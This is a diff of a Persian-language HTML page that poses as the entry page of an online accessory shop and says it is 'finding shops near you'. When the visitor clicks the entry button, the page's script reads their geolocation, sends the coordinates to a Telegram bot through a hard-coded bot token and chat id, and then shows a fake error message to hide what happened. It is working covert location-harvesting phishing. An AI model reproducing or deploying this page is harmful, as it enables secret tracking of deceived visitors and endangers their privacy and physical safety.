@@ -1,29 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa">
 <head>
-	<title>https://vinaaccessory.com/</title>
+  <meta charset="UTF-8">
+  <title>https://vinaaccessory.com/</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- فونت فارسی Vazir از CDN -->
+  <link href="https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.css" rel="stylesheet" type="text/css" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazir', sans-serif;
+      background: linear-gradient(135deg, #f6e58d, #ffbe76);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      color: #2f3640;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 1.3em;
+      margin-bottom: 30px;
+    }
+
+    button {
+      background-color: #e1b12c;
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      font-size: 1.2em;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    button:hover {
+      background-color: #d4a017;
+      transform: scale(1.05);
+    }
+
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 2em;
+      }
+
+      p {
+        font-size: 1.1em;
+      }
+
+      button {
+        width: 80%;
+        font-size: 1em;
+        padding: 12px 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-	<h1>در حال ورود به سایت...</h1>
-	<p>شناسایی فروشگاه های نزدیک به شما...</p>
-	<button onclick="getLocation()">ورود به وینا اکسسوری</button>
-	<script>
-		function getLocation() {
-			if (navigator.geolocation) {
-				navigator.geolocation.getCurrentPosition(showPosition);
-			} else {
-				alert("Geolocation is not supported by this browser.");
-			}
-		}
-		function showPosition(position) {
-			var latitude = position.coords.latitude;
-			var longitude = position.coords.longitude;
-			var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=tel:8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
-			var xhr = new XMLHttpRequest();
-			xhr.open("GET", url, true);
-			xhr.send();
-			alert("خطا! دوباره امتحان کنید.از طریق کروم نام سایت را جستجو کنید");
-		}
-	</script>
+  <h1>در حال ورود به سایت</h1>
+  <p>شناسایی فروشگاه های نزدیک به شما...</p>
+  <button onclick="getLocation()">ورود به وینا اکسسوری</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+      var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      xhr.send();
+      alert("خطا! دوباره امتحان کنید");
+    }
+  </script>
 </body>
 </html>
